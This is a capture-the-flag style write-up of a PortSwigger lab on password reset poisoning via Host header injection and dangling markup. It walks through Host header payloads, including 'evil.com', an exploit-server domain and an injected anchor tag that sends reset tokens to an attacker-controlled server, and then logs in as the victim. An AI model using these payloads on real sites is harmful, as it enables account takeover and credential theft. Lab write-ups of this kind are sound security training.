## Labs Covered

This write-up focuses on the following **EXPERT-level lab** from the PortSwigger Web Security Academy related to **HTTP Host Header Attacks**:

**Password reset poisoning via dangling markup**  
This lab demonstrates how attackers can exploit dangling markup combined with unsanitized Host headers to poison password reset links and compromise user accounts.

---

### LAB 7 - Password reset poisoning via dangling markup

### Lab Description

<img width="917" height="474" alt="image" src="https://github.com/user-attachments/assets/6b30f451-02d5-48a3-b177-7615cba89214" />

### Solution

### **Step-by-step Process**

#### 1. **Trigger Password Reset for Wiener**

* Go to the **forgot password** functionality as user **wiener**.
* Submit the request and **intercept it using Burp Suite**.
* Forward the request to initiate the password reset process.

   <img width="1888" height="759" alt="image" src="https://github.com/user-attachments/assets/a1ac68ce-08f2-4c30-89e9-ab96d49fd14f" />


#### 2. **Monitor Exploit Server for Reset Email**

* Visit the **Exploit Server** provided by the lab.
  <img width="1104" height="580" alt="image" src="https://github.com/user-attachments/assets/ed8bbdfb-0237-49b7-9596-1523e7671ba0" />

* Click on the **“Email Client”** feature.
* You will see a **reset password email** for wiener that includes:

  * A **reset link**.
  * A **temporary password** or a clickable link to login.
 
    <img width="1524" height="410" alt="image" src="https://github.com/user-attachments/assets/ea103dec-f934-469e-8338-0270fcfdaf01" />


#### 3. **Test Host Header Manipulation**

* Go back to the **forgot password request**, and **modify the `Host` header** to something arbitrary (e.g., `Host: evil.com`).


* You will likely receive a **504 Internal Server Error** — indicating that the application uses the Host header when generating the reset link.

     <img width="1850" height="652" alt="image" src="https://github.com/user-attachments/assets/8ded5aed-763d-4c17-9b11-b38428d35b26" />

#### 4. **Test with Exploit Server Domain**

* Replace the `Host` header with your **exploit server domain**, such as:

  ```
  Host: exploit-0a0c00...exploit-server.net
  ```
* Submit the request — if successful, the **password reset link will point to your server**.

<img width="1866" height="625" alt="image" src="https://github.com/user-attachments/assets/b56b960f-1815-4c22-b5c6-31f557e3ffee" />

#### 5. **Testing with Arbitrary Port**

* You can also test if the server accepts arbitrary ports in the Host header:


  ```
  Host: exploit-0a0c00...exploit-server.net:90
  ```
<img width="1830" height="753" alt="image" src="https://github.com/user-attachments/assets/6f1b9aae-4c5b-4b55-8854-cbf2906d6bc2" />

  
* If password still gets reset, it means the application is vulnerable and includes the full Host value (including port) in the reset link.


<img width="1744" height="623" alt="image" src="https://github.com/user-attachments/assets/6a5cc449-9b87-4cbf-9c12-157ce28424c1" />

#### 6. **Injecting a Malicious Host Payload**

* Try injecting the Host header with a URL-prefixed payload like:

  ```bash
      Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?

  ```
* This format tricks the application into generating a password reset link that **sends the token to your server**.

<img width="1896" height="756" alt="image" src="https://github.com/user-attachments/assets/0710c39d-a3a4-4de2-9a2d-e62c695d0a8b" />

#### 7. **Verify on Exploit Server**

* Go to your exploit server's **access log** or monitor incoming requests.
<img width="1911" height="39" alt="image" src="https://github.com/user-attachments/assets/96a29622-08b4-49a8-99c7-2b620036b823" />

* You should see a request containing the **reset token or temporary password**.
* In this test, we are doing this for **wiener** — not carlos.

#### 8. **Login as Wiener**

* Use the stolen reset token or password to **log in as wiener**.

  <img width="1689" height="676" alt="image" src="https://github.com/user-attachments/assets/a5f709f1-0c63-4992-934c-ec983b7448ee" />

* This confirms that the exploit works.

#### 9. **Repeat for Carlos**

* Go back to the **forgot password** form and submit a reset request for **carlos**.
* Use the same Host header injection payload:

  ```bash
     Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?

  ```
* Intercept and forward the request.

  <img width="1238" height="499" alt="image" src="https://github.com/user-attachments/assets/cdc73664-6917-4713-acb5-251261d482d6" />


#### 10. **Extract Carlos's Token**

* Check your **exploit server access logs**.

<img width="1904" height="147" alt="image" src="https://github.com/user-attachments/assets/1e374edd-7d1e-47e6-910d-121d9f274700" />

* You should now see the reset link or password for **carlos**.

#### 11. **Log in as Carlos**

* Use the password from the intercepted link to **log in as carlos**.
* Lab is **successfully solved**.

<img width="1573" height="741" alt="image" src="https://github.com/user-attachments/assets/e7051356-c8c7-4cc1-be3d-4550d7b776fc" />

	

---
